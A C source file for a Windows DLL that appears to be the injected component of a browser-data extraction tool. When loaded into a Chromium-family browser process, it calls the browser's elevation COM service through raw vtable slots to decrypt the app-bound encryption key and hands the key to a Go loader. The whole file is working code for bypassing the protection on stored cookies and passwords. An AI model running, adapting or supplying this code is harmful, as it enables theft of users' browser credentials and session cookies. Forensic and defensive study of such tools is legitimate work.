// SPDX-License-Identifier: Apache-2.0

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>
#include <oaidl.h>
#include <wincrypt.h>

#include "bootstrap.h"
#include "com_iid.h"

#define ENV_ENC_B64 "HBD_ABE_ENC_B64"
#define ENV_ENC_MAX 8192

static void DoExtractKey(BYTE *imageBase);
static BOOL GetOwnExeBasename(char *buf, DWORD bufsize);
static BOOL Base64DecodeStack(const char *b64, BYTE *out_buf, DWORD *out_len);
static HRESULT CallDecryptDataBySlot(IUnknown *pObj, unsigned int vtblIndex,
                                      const BSTR bstrEnc, BSTR *pOut, DWORD *pErr);

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInstance);
        if (lpReserved != NULL) {
            DoExtractKey((BYTE *)lpReserved);
        }
    }
    return TRUE;
}

static void DoExtractKey(BYTE *imageBase)
{
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    BOOL weInited = SUCCEEDED(hr);

    char exeBasename[MAX_PATH];
    if (!GetOwnExeBasename(exeBasename, (DWORD)sizeof(exeBasename))) {
        goto cleanup_com;
    }

    const BrowserComIds *ids = LookupBrowserByExe(exeBasename);
    if (!ids) {
        goto cleanup_com;
    }

    char envEnc[ENV_ENC_MAX];
    DWORD envEncLen = GetEnvironmentVariableA(ENV_ENC_B64, envEnc, ENV_ENC_MAX);
    if (envEncLen == 0 || envEncLen >= ENV_ENC_MAX) {
        goto cleanup_com;
    }

    BYTE encKey[ENV_ENC_MAX];
    DWORD encKeyLen = ENV_ENC_MAX;
    if (!Base64DecodeStack(envEnc, encKey, &encKeyLen) || encKeyLen == 0) {
        goto cleanup_com;
    }

    BSTR bstrEnc = SysAllocStringByteLen((LPCSTR)encKey, encKeyLen);
    SecureZeroMemory(encKey, ENV_ENC_MAX);
    SecureZeroMemory(envEnc, ENV_ENC_MAX);
    if (!bstrEnc) {
        goto cleanup_com;
    }

    // IElevator2 is Chrome 144+; older vendors only implement v1.
    IUnknown *pObj = NULL;
    if (ids->has_iid_v2) {
        hr = CoCreateInstance(&ids->clsid, NULL, CLSCTX_LOCAL_SERVER,
                              &ids->iid_v2, (void **)&pObj);
        if (FAILED(hr)) {
            pObj = NULL;
        }
    }
    if (!pObj) {
        hr = CoCreateInstance(&ids->clsid, NULL, CLSCTX_LOCAL_SERVER,
                              &ids->iid_v1, (void **)&pObj);
        if (FAILED(hr)) {
            pObj = NULL;
        }
    }
    if (!pObj) {
        goto free_enc;
    }

    CoSetProxyBlanket(pObj,
                       RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                       COLE_DEFAULT_PRINCIPAL,
                       RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                       RPC_C_IMP_LEVEL_IMPERSONATE,
                       NULL, EOAC_DYNAMIC_CLOAKING);

    BSTR bstrPlain = NULL;
    DWORD comErr = 0;
    hr = CallDecryptDataBySlot(pObj, DecryptDataVtblIndex(ids->kind),
                                bstrEnc, &bstrPlain, &comErr);
    pObj->lpVtbl->Release(pObj);

    if (SUCCEEDED(hr) && bstrPlain) {
        UINT plainLen = SysStringByteLen(bstrPlain);
        if (plainLen == BOOTSTRAP_KEY_LEN) {
            // Write key before status; Go reads key only after status==READY.
            for (UINT i = 0; i < BOOTSTRAP_KEY_LEN; ++i) {
                imageBase[BOOTSTRAP_KEY_OFFSET + i] = ((BYTE *)bstrPlain)[i];
            }
            MemoryBarrier();
            imageBase[BOOTSTRAP_KEY_STATUS_OFFSET] = BOOTSTRAP_KEY_STATUS_READY;
        }
        SecureZeroMemory(bstrPlain, plainLen);
        SysFreeString(bstrPlain);
    }

free_enc:
    SysFreeString(bstrEnc);

cleanup_com:
    if (weInited) {
        CoUninitialize();
    }
}

static BOOL GetOwnExeBasename(char *buf, DWORD bufsize)
{
    char path[MAX_PATH];
    DWORD n = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) {
        return FALSE;
    }

    const char *base = path;
    for (DWORD i = 0; i < n; ++i) {
        if (path[i] == '\\' || path[i] == '/') {
            base = path + i + 1;
        }
    }

    DWORD j = 0;
    while (*base && j + 1 < bufsize) {
        char c = *base++;
        if (c >= 'A' && c <= 'Z') {
            c = (char)(c - 'A' + 'a');
        }
        buf[j++] = c;
    }
    buf[j] = '\0';
    return j > 0;
}

static BOOL Base64DecodeStack(const char *b64, BYTE *out_buf, DWORD *out_len)
{
    DWORD flags = 0;
    DWORD skip = 0;
    return CryptStringToBinaryA(b64, 0, CRYPT_STRING_BASE64,
                                 out_buf, out_len, &skip, &flags);
}

// Slot-based vtable dispatch lets us avoid declaring each vendor's full
// C++ interface in C. Slots (5/8/13) are set per-vendor in com_iid.c.
static HRESULT CallDecryptDataBySlot(IUnknown *pObj, unsigned int vtblIndex,
                                      const BSTR bstrEnc, BSTR *pOut, DWORD *pErr)
{
    typedef HRESULT(STDMETHODCALLTYPE *DecryptDataFn)(
        void *This, const BSTR, BSTR *, DWORD *);

    if (!pObj || vtblIndex == 0) {
        return E_INVALIDARG;
    }
    void **vtbl = (void **)pObj->lpVtbl;
    DecryptDataFn fn = (DecryptDataFn)vtbl[vtblIndex];
    if (!fn) {
        return E_POINTER;
    }
    return fn(pObj, bstrEnc, pOut, pErr);
}
